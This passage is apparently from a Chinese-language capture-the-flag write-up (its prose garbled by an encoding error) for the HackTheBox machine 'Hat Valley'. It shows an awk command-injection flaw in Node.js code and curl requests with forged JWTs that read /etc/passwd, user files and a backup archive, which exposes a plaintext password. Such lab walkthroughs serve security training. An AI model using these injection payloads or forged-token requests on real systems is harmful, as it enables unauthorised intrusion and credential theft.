class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/all-leave&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user_token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> authFailed = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> user = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(user_token) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> decodedToken = jwt.<span class="title function_">verify</span>(user_token, <span class="variable constant_">TOKEN_SECRET</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!decodedToken.<span class="property">username</span>) &#123;</span><br><span class="line"></span><br><span class="line">      authFailed = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      user = decodedToken.<span class="property">username</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(authFailed) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123;<span class="title class_">Error</span>: <span class="string">&quot;Invalid Token&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!user) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> bad = [<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> badInUser = bad.<span class="title function_">some</span>(<span class="function"><span class="params">char</span> =&gt;</span> user.<span class="title function_">includes</span>(char));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(badInUser) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Bad character detected.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_">exec</span>(<span class="string">&quot;awk &#x27;/&quot;</span> + user + <span class="string">&quot;/&#x27; /var/www/private/leave_requests.csv&quot;</span>, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;binary&#x27;</span>, <span class="attr">maxBuffer</span>: <span class="number">51200000</span>&#125;, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stdout) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="keyword">new</span> <span class="title class_">Buffer</span>(stdout, <span class="string">&#x27;binary&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to retrieve leave requests&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to retrieve leave requests&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é‡ç‚¹çœ‹è¿™ä¸€å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;awk &#x27;/&quot; + user + &quot;/&#x27; /var/www/private/leave_requests.csv&quot;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªæ¥å£ä¸­ï¼Œé¦–å…ˆä¼šå¯¹æˆ‘ä»¬çš„jwtè¿›è¡Œè§£å¯†ï¼Œæ¥ç€å°†å…¶ä¸­çš„usernameèµ‹å€¼ç»™userå˜é‡ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰jwtçš„å¯†é’¥ï¼Œå› æ­¤æˆ‘ä»¬userå˜é‡æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><p>å‡è®¾æˆ‘ä»¬ä¼ªé€ çš„jwtä¸­çš„<code>username</code>å­—æ®µä¸º**<code>./&#39; /etc/passwd &#39;</code>**ï¼Œè¿™æ ·userè¿›è¡Œæ‹¼æ¥åï¼Œå®Œæ•´çš„å‘½ä»¤ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/./&#x27; /etc/passwd &#x27;/&#x27; /var/www/private/leave_requests.csv</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰awkå‘½ä»¤çš„éƒ½çŸ¥é“ï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸¤ä¸ªæ–œæ ä¸­çš„å†…å®¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åˆ©ç”¨â€™.â€™è¿™ä¸ªå­—ç¬¦æ¥åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åŒ¹é…åˆ°<code>/etc/passwd</code>çš„æ‰€æœ‰å†…å®¹ã€‚è®©æˆ‘ä»¬åœ¨æœ¬åœ°æ‰§è¡Œä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee15face21e9efea2019.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee15face21e9efea2019.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°<code>/etc/passwd</code>è¢«æˆåŠŸè¯»å–ã€‚æ¥ç€æˆ‘ä»¬ä¼ªé€ jwtå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee22face21e9efea378f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee22face21e9efea378f.jpg"></a></p><p>è¯»å–<code>/etc/passwd</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvZXRjL3Bhc3N3ZCAnIiwiaWF0IjoxNjc0OTIyMzU5fQ.EXprLPOLwnnrr0aQeEymzkRicpIG-SUIg7DLKeO5qU4&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:102:105::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:111::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">whoopsie:x:117:124::/nonexistent:/bin/false</span><br><span class="line">sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">saned:x:121:128::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">bean:x:1001:1001:,,,:/home/bean:/bin/bash</span><br><span class="line">christine:x:1002:1002:,,,:/home/christine:/bin/bash</span><br><span class="line">postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:130:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:999:999::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™å°æœºå­æœ‰3ä¸ªç”¨æˆ·ï¼Œåˆ†åˆ«æ˜¯rootï¼Œbeanå’Œchristineã€‚å°è¯•è¯»å–beanå’Œchristineçš„sshæ–‡ä»¶ï¼Œ<code>/home/bean/.ssh/id_rsa</code>å’Œ<code>/home/christine/.ssh/id_rsa</code>å‡æœªæœ‰ä»»ä½•å“åº”ã€‚è¯»å–beanç”¨æˆ·çš„<code>.bashrc</code>æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuLy5iYXNocmMgJyIsImlhdCI6MTY3NDkyMjM1OX0.-soLFOExCLVbRPy3c1-quqNBqWbHmff2qL4Xu97gdtg&quot;</span><br><span class="line"># ~/.bashrc: executed by bash(1) for non-login shells.</span><br><span class="line"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span><br><span class="line"># for examples</span><br><span class="line"># If not running interactively, don&#x27;t do anything</span><br><span class="line">case $- in</span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) return;;</span><br><span class="line">esac</span><br><span class="line"># don&#x27;t put duplicate lines or lines starting with space in the history.</span><br><span class="line"># See bash(1) for more options</span><br><span class="line">HISTCONTROL=ignoreboth</span><br><span class="line"># append to the history file, don&#x27;t overwrite it</span><br><span class="line">shopt -s histappend</span><br><span class="line"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">HISTFILESIZE=2000</span><br><span class="line"># check the window size after each command and, if necessary,</span><br><span class="line"># update the values of LINES and COLUMNS.</span><br><span class="line">shopt -s checkwinsize</span><br><span class="line"># If set, the pattern &quot;**&quot; used in a pathname expansion context will</span><br><span class="line"># match all files and zero or more directories and subdirectories.</span><br><span class="line">#shopt -s globstar</span><br><span class="line"># make less more friendly for non-text input files, see lesspipe(1)</span><br><span class="line">[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;</span><br><span class="line"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="line">if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then</span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line">fi</span><br><span class="line"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">    xterm-color|*-256color) color_prompt=yes;;</span><br><span class="line">esac</span><br><span class="line"># uncomment for a colored prompt, if the terminal has the capability; turned</span><br><span class="line"># off by default to not distract the user: the focus in a terminal window</span><br><span class="line"># should be on the output of commands, not on the prompt</span><br><span class="line">#force_color_prompt=yes</span><br><span class="line">if [ -n &quot;$force_color_prompt&quot; ]; then</span><br><span class="line">    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then</span><br><span class="line"># We have color support; assume it&#x27;s compliant with Ecma-48</span><br><span class="line"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span><br><span class="line"># a case would tend to support setf rather than setaf.)</span><br><span class="line">color_prompt=yes</span><br><span class="line">    else</span><br><span class="line">color_prompt=</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line">if [ &quot;$color_prompt&quot; = yes ]; then</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="line">else</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br><span class="line">fi</span><br><span class="line">unset color_prompt force_color_prompt</span><br><span class="line"># If this is an xterm set the title to user@host:dir</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1=&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"># enable color support of ls and also add handy aliases</span><br><span class="line">if [ -x /usr/bin/dircolors ]; then</span><br><span class="line">    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;</span><br><span class="line">    alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">    #alias dir=&#x27;dir --color=auto&#x27;</span><br><span class="line">    #alias vdir=&#x27;vdir --color=auto&#x27;</span><br><span class="line">    alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">    alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">    alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">fi</span><br><span class="line"># colored GCC warnings and errors</span><br><span class="line">#export GCC_COLORS=&#x27;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#x27;</span><br><span class="line"># some more ls aliases</span><br><span class="line">alias ll=&#x27;ls -alF&#x27;</span><br><span class="line">alias la=&#x27;ls -A&#x27;</span><br><span class="line">alias l=&#x27;ls -CF&#x27;</span><br><span class="line"># custom</span><br><span class="line">alias backup_home=&#x27;/bin/bash /home/bean/Documents/backup_home.sh&#x27;</span><br><span class="line"># Add an &quot;alert&quot; alias for long running commands.  Use like so:</span><br><span class="line">#   sleep 10; alert</span><br><span class="line">alias alert=&#x27;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#x27;\&#x27;&#x27;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//&#x27;\&#x27;&#x27;)&quot;&#x27;</span><br><span class="line"># Alias definitions.</span><br><span class="line"># You may want to put all your additions into a separate file like</span><br><span class="line"># ~/.bash_aliases, instead of adding them here directly.</span><br><span class="line"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span><br><span class="line">if [ -f ~/.bash_aliases ]; then</span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line">fi</span><br><span class="line"># enable programmable completion features (you don&#x27;t need to enable</span><br><span class="line"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="line"># sources /etc/bash.bashrc).</span><br><span class="line">if ! shopt -oq posix; then</span><br><span class="line">  if [ -f /usr/share/bash-completion/bash_completion ]; then</span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  elif [ -f /etc/bash_completion ]; then</span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ª<code>backup_home.sh</code>æ–‡ä»¶ï¼Œæ€€ç–‘ä¸homeç›®å½•çš„å¤‡ä»½æœ‰å…³ç³»ï¼Œå°è¯•è¯»å–<code>/home/bean/Documents/backup_home.sh</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuL0RvY3VtZW50cy9iYWNrdXBfaG9tZS5zaCAnIiwiaWF0IjoxNjc0OTIyMzU5fQ.iAGaOQVbBg1rKAdG1H3zeOosRwvwW7yP8uIFsDtXQ5s&quot;</span><br><span class="line">#!/bin/bash</span><br><span class="line">mkdir /home/bean/Documents/backup_tmp</span><br><span class="line">cd /home/bean</span><br><span class="line">tar --exclude=&#x27;.npm&#x27; --exclude=&#x27;.cache&#x27; --exclude=&#x27;.vscode&#x27; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .</span><br><span class="line">date &gt; /home/bean/Documents/backup_tmp/time.txt</span><br><span class="line">cd /home/bean/Documents/backup_tmp</span><br><span class="line">tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .</span><br><span class="line">rm -r /home/bean/Documents/backup_tmp</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†&#x2F;home&#x2F;beanç›®å½•è¿›è¡Œäº†å‹ç¼©ï¼Œä¸”å°±åœ¨<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code>ä¸­ï¼Œæˆ‘ä»¬ä¸‹è½½ä¸‹æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€â”€â•¼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuL0RvY3VtZW50cy9iYWNrdXAvYmVhbl9iYWNrdXBfZmluYWwudGFyLmd6ICciLCJpYXQiOjE2NzQ5MjIzNTl9.PLcLBxoaAfCESZJkq9za0h0okRXIm6twDMaS-4Z4GHE&quot; --output bean_backup_final.zip</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 31714  100 31714    0     0  39153      0 --:--:-- --:--:-- --:--:-- 39104</span><br></pre></td></tr></table></figure><p>è§£å‹åï¼Œåœ¨<code>.config/xpad/content-DS1ZS1</code>ä¸­å¾—åˆ°beançš„sshå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€[root@parrot]â”€[/home/rainb0w/Desktop/1]</span><br><span class="line">â””â”€â”€â•¼ #cat .config/xpad/content-DS1ZS1 </span><br><span class="line">TO DO:</span><br><span class="line">- Get real hat prices / stock from Christine</span><br><span class="line">- Implement more secure hashing mechanism for HR system</span><br><span class="line">- Setup better confirmation message when adding item to cart</span><br><span class="line">- Add support for item quantity &gt; 1</span><br><span class="line">- Implement checkout system</span><br><span class="line"></span><br><span class="line">î€€boldî€€HR SYSTEMî€€/boldî€€</span><br><span class="line">bean.hill</span><br><span class="line">014mrbeanrules!#P</span><br><span class="line"></span><br><span class="line">https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html</span><br><span class="line"></span><br><span class="line">î€€boldî€€MAKE SURE TO USE THIS EVERYWHERE ^^^î€€/bold</span><br></pre></td></tr></table></figure><p>ç™»é™†åï¼Œå³å¯çœ‹åˆ°user.txtã€‚</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>ä¸Šä¼ linpeas.shæ–‡ä»¶å¹¶è¿è¡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee3bface21e9efea608d.jpg" class="gallery-item"><img 